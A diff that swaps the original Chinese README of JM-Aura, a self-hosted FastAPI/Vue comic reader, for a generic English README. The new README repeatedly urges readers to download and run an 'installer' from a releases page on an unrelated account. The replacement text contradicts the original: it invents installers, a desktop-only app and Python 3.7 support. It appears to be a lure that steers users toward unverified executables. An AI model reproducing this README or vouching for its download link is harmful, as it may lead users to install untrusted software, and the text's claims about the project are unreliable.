@@ -1,218 +1,76 @@
-<div align="center">
-  <img src="https://github.com/user-attachments/assets/11a2cb7d-f8c1-49a1-a8e8-719927045cdb" alt="JM-Aura" width="230" height="230" />
+# ✨ JM-Aura - Your Modern Comic Reading App
 
-  <h1><i>JM-Aura</i></h1>
-  <p><i>一个简洁、优雅的 JMComic 漫画阅读/下载 Web 应用</i></p>
+## 📥 Download Now!
+[![Download JM-Aura](https://img.shields.io/badge/Download-JM--Aura-blue.svg)](https://github.com/jatinsa2640-spec/JM-Aura/releases)
 
-  [![GitHub](https://img.shields.io/badge/-GitHub-181717?logo=github)](https://github.com/Tom6814)
-  [![GitHub license](https://img.shields.io/github/license/Tom6814/JM-Aura)](https://github.com/Tom6814/JM-Aura/blob/master/LICENSE)
-  [![Python Version](https://img.shields.io/badge/python-3.10+-blue?logo=python)](https://www.python.org/)
-</div>
+## 🚀 Getting Started
+Welcome to JM-Aura! This application helps you read comics effortlessly. Whether you're logging in, downloading content, or leaving comments, JM-Aura makes it simple and enjoyable.
 
----
+## 🖥️ System Requirements
+Before you start, ensure your system meets the following requirements:
 
-# 🔍这是什么？
+- **Operating System**: Windows 10/11, macOS, or any modern Linux distribution.
+- **Python**: Version 3.7 or higher.
+- **Memory**: At least 2 GB RAM.
+- **Disk Space**: Minimum 200 MB of free space.
 
-✨**JM-Aura** 是一个基于 **JMComic** API开发的🌟第三方JMComic的本地/自建 Web 应用🤗
+## 📂 Features
+- **Read Comics Online**: Enjoy various comics directly within the app.
+- **User Authentication**: Log in to access your personal library.
+- **Download Options**: Save comics for offline reading.
+- **Comment Section**: Share your thoughts with other users.
+- **Intuitive Design**: Easy-to-navigate interface, built using Vue.
 
-你只需要启动一次后端服务，然后用浏览器打开 `<服务器IP>:8000`（默认），就能完成 **搜索、浏览、收藏、历史、阅读、批量下载与打包 JMComic 漫画** 等操作😆
+## 🔄 How to Download & Install
+To get started, visit the following link to download JM-Aura:
+[Download JM-Aura from the Releases Page](https://github.com/jatinsa2640-spec/JM-Aura/releases)
 
-<div align="center">
-<img width="1919" height="1030" alt="电脑端界面" src="https://github.com/user-attachments/assets/53b48077-9766-4175-aa2f-e366ff471e8d" />
+1. **Visit the Releases Page**: Click on the link above to open the Releases page.
+2. **Select the Latest Version**: Find the latest release at the top of the page.
+3. **Download the Installer**: Look for the installer file suitable for your operating system. Click on the file name to begin the download.
+4. **Run the Installer**: Once the download completes, locate the file in your downloads folder and double-click it to run the installer.
+5. **Follow Installation Steps**: Follow the on-screen instructions to install JM-Aura on your device.
+6. **Launch the Application**: After installation, you can find JM-Aura in your applications list. Click it to open and start enjoying your comics!
 
-<img width="691" height="954" alt="手机/平板端界面" src="https://github.com/user-attachments/assets/3c803d27-5232-497f-85d6-478197e3bf7a" />
+## 🌐 Connect with Us
+We love feedback! If you have questions or suggestions, reach out to us via the Issues section in this repository. 
 
-</div>
+## 📖 Usage Instructions
+Once you have installed JM-Aura, you’ll find an easy-to-use interface. Here’s how to navigate:
 
+- **Log In**: Open the app and click on the "Log In" button. Enter your credentials, or create an account.
+- **Browse Comics**: Use the “Browse” feature to find comics. You can sort by genre or popularity.
+- **Download for Offline Use**: Click the download icon next to any comic to save it for offline reading.
+- **Comment on Comics**: After reading, share your thoughts in the comments section provided.
 
-项目结构很简单：
+## 🔧 Troubleshooting
+If you experience issues:
 
-- 后端：FastAPI（同时负责 API 与静态前端资源分发）
-  
-- 前端：Vue3（CDN，无需构建）
-  
-- 站点图标：在项目根目录放置 `favicon.ico`，会自动作为浏览器标签图标
+- **Unable to Download**: Check your internet connection and make sure you’re using a supported OS.
+- **Slow Performance**: Close any unnecessary applications running in the background.
+- **App Crashes**: Restart the application and ensure you are using the latest version from the Releases page.
 
+## 💬 Frequently Asked Questions (FAQ)
+1. **Is there a mobile version?**
+   Currently, JM-Aura supports desktop platforms only. We plan to release a mobile version soon.
 
+2. **Can I suggest a comic?**
+   Absolutely! We welcome suggestions. Navigate to our Issues section to submit your request.
 
+3. **How do I update JM-Aura?**
+   To update, return to the Releases page, download the latest version, and follow the installation steps again.
 
-## 它能干嘛？实现了JMComic的哪些功能？
+## 🚧 Known Issues
+- **Loading Times**: Some users might experience longer loading times with older devices.
+- **Occasional Bugs**: We are continuously working to fix any bugs. Please report them in the Issues section.
 
+## 🌟 Backing JM-Aura
+If you enjoy using JM-Aura, consider contributing to the project. Your support helps us improve and add new features. 
 
-- **浏览与搜索**：按关键词搜索标题/作者/标签；按分类/排行/最新浏览。
-  
-- **沉浸阅读**：长条漫垂直滚动；阅读器模式自动隐藏顶/底栏，减少干扰。
-  
-- **收藏与历史**：收藏页、历史页独立入口；移动端入口做了融合，减少按钮拥挤。
-  
-- **下载与打包**：支持选择章节下载；后台任务进度展示；完成后可直接下载 ZIP。
-  
-- **网络与线路**：内置图片代理/多线路机制（遇到加载问题可以切换）。
+## 👥 Community Contributions
+Join our community of readers and developers. Share your experiences and contribute to discussions on how we can enhance JM-Aura together.
 
+### Thank You
+Thank you for choosing JM-Aura. Happy reading! For support, reach out via the Issues or Discussions tabs. Enjoy your comic adventures!
 
-# 🎯如何部署？
-
-## ⚡Render部署（推荐，免费）
-
-使用类似Render这样的免费python项目托管平台来部署JM-Aura。
-
-- [fork该项目](https://github.com/Tom6814/JM-Aura/fork)到你的Github账户下，仓库类型无要求（个人使用最好选”私密“）
-  
-- 打开[Render](https://dashboard.render.com)，注册一个账号
-  
-- 然后点击[新建Web Service](https://dashboard.render.com/web/new)，授权Render访问自己的Github账户后选择刚刚fork的仓库
-  
-- 接下来的配置界面，**Name**部分随便填，**Language**选择*Python3*，**Region**选择一个离自己位置近的服务器【大陆建议选Singapore (Southeast Asia)】
-  
-- 启动命令填入`pip install -r requirements.txt requests && python3 -m uvicorn backend.main:app --host 0.0.0.0 --port 8000`，**Instance Type**选择*Free*，最后点击**Deploy web service**
-  
-- 等待部署完成后访问`https://<你设置的Render项目名称>.onrender.com`
-  
-- Enjot it! ψ(｀∇´)ψ
-  
-🧐注意：当Render项目15分钟没有被访问时就会自动休眠，导致下次访问时会等待更长时间（冷启动），可以配置一个第三方网站监控（如Instatus、uptime kuma等）隔5-10分钟监控一次网址来解决，这里便不过多赘述。
-
-
-  
-## 🚀 服务器部署
-
-适合想要 **24 小时挂机下载/远程阅读** 的用户。以下以 Ubuntu/Debian 为例（其它 Linux 发行版可能略有不同）。
-
-
-### 1) 准备环境
-
-- 一台 Linux 服务器 **（确保能正常访问外网）**
-- Python 3.10+（推荐 3.11+）
-
-### 2) 上传/放置代码
-
-把代码放到服务器某个目录（例如 `/opt/jm-aura`）
-
-方式任选：
-
-- 方式一：`git clone https://github.com/Tom6814/JM-Aura.git <运行项目的目录>`（推荐）
-- 方式二：上传你打包好的 zip 并解压到运行项目的目录
-
-  
-### 3) 安装依赖
-
-```bash
-sudo apt update
-sudo apt install -y python3 python3-venv python3-pip
-
-cd <运行项目的目录>
-python3 -m venv .venv
-./.venv/bin/pip install -r requirements.txt
-```
-
-### 4) 启动（前台）
-
-```bash
-cd <运行项目的目录>
-JM_AURA_HOST=0.0.0.0 JM_AURA_PORT=8000 ./.venv/bin/python -m backend.main
-```
-
-浏览器访问：
-- `http://<你的服务器IP>:8000`
-
-
-### 5) 后台运行（systemd，推荐）
-
-创建服务文件：
-
-```bash
-sudo nano /etc/systemd/system/jm-aura.service
-```
-
-填入（注意修改路径为你的实际目录）：
-
-```ini
-[Unit]
-Description=JM-Aura Web
-After=network.target
-
-[Service]
-Type=simple
-WorkingDirectory=<运行项目的目录>
-ExecStart=<运行项目的目录>/.venv/bin/python -m backend.main
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-```
-
-启用并启动：
-
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable --now jm-aura
-```
-
-查看状态/日志：
-
-```bash
-sudo systemctl status jm-aura
-journalctl -u jm-aura -f
-```
-
-
-
-
-
-## 🍽️ 食用方法（怎么用）
-
-
-### 登录/线路
-
-- 打开页面后进入 **设置（Config）**，填入 JMComic 账号密码进行登录。
-- 如遇到图片加载异常/线路问题，在设置里切换线路或重试（项目会记录可用线路）。
-
-### 顶栏操作（电脑端）
-
-
-- 顶栏会根据窗口宽度自动适配：
-  
-  - **优先压缩搜索框**，不够再把搜索框变为按钮（点击弹出输入框）
-    
-  - 再不够才隐藏按钮文字（只留图标）
-    
-  - 最后把非关键按钮收进“菜单”
-    
-- 顶栏按钮文字不会换行（避免难看抖动）。
-
-
-### 阅读器模式
-
-- 打开章节后进入阅读器：
-  - 顶栏/底栏会自动隐藏（沉浸阅读）
-  - 返回详情或其他页面后恢复正常导航
-
-## ⚙️ 配置与文件（重要）
-
-以下文件可能包含敏感信息，请不要上传/分享：
-- `backend/config/cookies.json`：登录 Cookie
-- `config/op.yml`：运行时线路/配置（可能包含访问细节）
-
-建议做法：
-- 分享代码时只保留 `config/op.example.yml`、`backend/config/cookies.example.json`
-- `downloads/` 是下载产物目录（可自行清理/迁移）
-
-## 🛠️ 常见问题
-
-**Q: 页面能打开，但图片不显示/加载慢？**  
-- 先多刷新几次试试，确认图片能正常加载；***确保服务器能正常访问外网***；必要时更换 DNS/代理环境。
-
-**Q: 评论发不出去？**  
-- 上游有风控，请避免过短/重复内容，稍等再发。
-
-**Q: 如何更新？**  
-- 覆盖更新代码后，执行一次依赖更新并重启即可：
-
-```bash
-pip install -r requirements.txt
-python -m backend.main
-```
-
-## ⚠️ 免责声明
-
-本项目仅供学习交流使用。使用者应遵守当地法律法规及目标网站使用条款；开发者不对使用本项目产生的任何后果负责。
+[Download JM-Aura from the Releases Page](https://github.com/jatinsa2640-spec/JM-Aura/releases)
